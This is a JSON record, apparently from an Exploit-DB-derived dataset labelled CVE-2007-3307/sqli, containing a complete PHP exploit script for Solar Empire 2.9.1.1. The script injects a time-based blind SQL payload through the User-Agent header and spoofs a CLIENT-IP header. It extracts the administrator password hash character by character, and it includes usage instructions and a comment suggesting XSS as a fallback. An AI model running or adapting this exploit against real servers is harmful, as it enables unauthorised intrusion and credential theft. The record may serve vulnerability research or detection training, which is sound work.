{
  "id": "4078",
  "title": "Solar Empire 2.9.1.1 - Blind SQL Injection / Hash Retrieve",
  "cve": "CVE-2007-3307",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"\r\n------------------------------------------------------------------------\r\nSolar Empire <= 2.9.1.1 Blind SQL Injection / Hash Retrieve Exploit\r\n\r\nby BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>\r\nThanks to rgod for the php code and Marty for the Love\r\n\r\nSpecial Thanks to all the guys of milw0rm IRC channel for theyr help\r\n\r\n------------------------------------------------------------------------\r\n\";\r\nif ($argc<3) {\r\necho \"\r\nUsage: php \".$argv[0].\" Host Path\r\nHost:          target server (ip/hostname)\r\nPath:          path of revbb\r\n\r\nExample:\r\nphp \".$argv[0].\" localhost /solar/\r\n\";\r\ndie;\r\n}\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n/*\r\nThis plattform is quite old, but i know that some guys tooked it for making some\r\nindipendent project.. they may have took this bug to, so i'll ceck as soon as i\r\nfinish my last exam..\r\n\r\nVuln Explanation:\r\n\r\ngoto common.inc.php:\r\n\r\nfunction insert_history($l_id,$i_text)\r\n{\r\n\tglobal $db_name;\r\n\tif(empty($db_name)){\r\n\t\t$db_name = \"None\";\r\n\t}\r\n\tdbn(\"insert into user_history VALUES ('$l_id','\".time().\"','$db_name','\".mysql_escape_string($i_text).\"','$_SERVER[REMOTE_ADDR]','$_SERVER[HTTP_USER_AGENT]')\");\r\n}\r\n\r\n$_SERVER[HTTP_USER_AGENT] is obviously not parsed by mq, so we can perform our sql-injection attack;\r\nBecause the admin name is always the same (Admin)we will attack this username, also because there isn't any counting\r\nof the login attempts..\r\n\r\nWARNING:\r\n\r\nold version of mysql may not support subquerys, so the exploit wouldn't work.\r\nto bypass this you can exploit the game sending an XSS into the log and praying that the admin\r\nsee it..\r\n\r\n*/\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n\r\n$port=80;\r\n$proxy=\"\";\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n$md5s[0]=0;//null\r\n$md5s=array_merge($md5s,range(48,57)); //numbers\r\n$md5s=array_merge($md5s,range(97,102));//a-f letters\r\n#print_r(array_values($md5s));\r\n\r\n$j=1;$password=\"\";\r\nwhile (!strstr($password,chr(0)))\r\n{\r\nfor ($i=0; $i<=255; $i++)\r\n{\r\nif (in_array($i,$md5s))\r\n{\r\n$starttime=time();\r\n$sql=\"FuckYOU'), (1,2,3,4,5,(SELECT IF ((ASCII(SUBSTRING(se_games.admin_pw,\".$j.\",1))=\".$i.\") & 1, benchmark(200000000,CHAR(0)),0) FROM se_games))/*\";\r\n$packet =\"POST \".$p.\"game_listing.php HTTP/1.0\\r\\n\";\r\n$data=\"l_name=Admin\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"CLIENT-IP: 999.999.999.999'; echo '123\\r\\n\";//spoof\r\n$packet.=\"User-Agent: $sql\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n  //debug\r\n  #die($html);\r\n  sendpacketii($packet);\r\nif (eregi(\"The used SELECT statements have a different number of columns\",$html)){echo $html; die(\"\\nunknown query error...\");}\r\n  $endtime=time();\r\n  echo \"endtime -> \".$endtime.\"\\r\\n\";\r\n  $difftime=$endtime - $starttime;\r\n  echo \"difftime -> \".$difftime.\"\\r\\n\";\r\n  if ($difftime > 7) {$password.=chr($i);echo \"password -> \".$password.\"[???]\\r\\n\";sleep(1);break;}\r\n}\r\n  if ($i==255) {die(\"Exploit failed...\");}\r\n  }\r\n  $j++;\r\n}\r\necho \"\r\n\r\n$uname Hash is:  $password\";\r\n\r\n# Coded With BH Fast Generator v0.1\r\n?>\r\n\r\n# milw0rm.com [2007-06-18]",
  "url": "https://www.exploit-db.com/exploits/4078"
}